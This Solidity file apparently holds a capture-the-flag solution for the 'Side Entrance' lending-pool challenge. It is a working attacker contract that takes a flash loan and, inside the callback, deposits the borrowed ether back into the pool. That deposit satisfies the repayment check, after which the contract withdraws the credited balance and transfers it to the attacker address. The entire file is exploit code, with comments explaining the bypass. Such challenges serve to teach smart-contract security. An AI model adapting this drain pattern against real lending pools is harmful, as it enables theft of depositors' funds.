// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "hardhat/console.sol";


interface ISideEnteranceLenderPool{
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceLenderPoolAttacker {
    ISideEnteranceLenderPool public pool;
    uint256 private _poolBalance;

    constructor(ISideEnteranceLenderPool pool_, uint256 poolBalance_){
        pool = pool_;
        _poolBalance = poolBalance_;
    }
    
    function attack(
        address payable attackerAddress
    ) external {
       console.log("attacker pool balance: %s", address(pool).balance);

       // flashLoan => execute => deposit => balances[msg.sender] = _poolBalance
       // this will bypass the balance check, and allow the attacker to keep the loan
       pool.flashLoan(_poolBalance);

      // the attacker withdraw the fund he deposited above
       pool.withdraw();

       attackerAddress.transfer(_poolBalance);
    }

    function execute(
    ) external payable {
        console.log("attacker: msg.sender: %s, value: %s, balance: %s", msg.sender, msg.value, address(pool).balance);
        pool.deposit{value: _poolBalance}();
    }

    // without this it will throw 'Address: unable to send value, recipient may have reverted'
    receive() external payable {}
}